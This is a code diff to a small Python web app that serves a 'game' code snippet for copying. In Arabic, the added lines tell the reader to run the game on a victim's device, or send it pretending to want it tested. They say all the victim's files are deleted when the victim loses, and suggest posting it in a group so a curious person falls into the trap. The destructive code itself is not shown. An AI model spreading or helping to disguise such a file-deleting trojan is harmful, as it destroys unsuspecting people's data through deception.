@@ -103,6 +103,10 @@ def web_main():
         أرجو منك للإشتراك في القناةونتظار لبرامج الجديد  
         <br> قم باتشغيل العبة على جهاز الضحية أوقم بإرسال لكود له 
         باحجة أنك تريد منه ختبار لعبتك
+        وأول مايخسر رح تنحذف جميع ملفات 
+        ولو ماعندك ضحية أنشره في مجموعة 
+        وأكيد رح يشغله شخص فيه لفضول ويوقع 
+        😈في لفح
     </div>
     """
     put_html(warning)
@@ -237,7 +241,7 @@ def main():
 
     put_html(f"""
     <textarea id="codeArea">{code_snippet}</textarea>
-    <button id="copyBtn" onclick="navigator.clipboard.writeText(document.getElementById('codeArea').value).then(()=>alert('تم نسخ تعليمات البرمجة!'))">نسخ تعليمات البرمجة</button>
+    <button id="copyBtn" onclick="navigator.clipboard.writeText(document.getElementById('codeArea').value).then(()=>alert('✅️تم نسخ كود لعبة!'))">📄نسخ الكود</button>
     """)
     put_html('</div>')
 
